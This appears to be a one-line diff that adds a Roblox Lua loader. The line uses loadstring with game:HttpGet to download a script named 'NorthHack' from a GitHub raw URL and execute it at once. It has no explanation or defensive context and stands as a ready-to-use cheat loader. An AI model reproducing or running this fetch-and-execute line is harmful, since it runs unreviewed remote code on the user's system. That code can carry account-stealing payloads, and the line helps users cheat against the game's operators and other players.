@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zu0aX/NORTHWIND/main/NorthHack",true))();
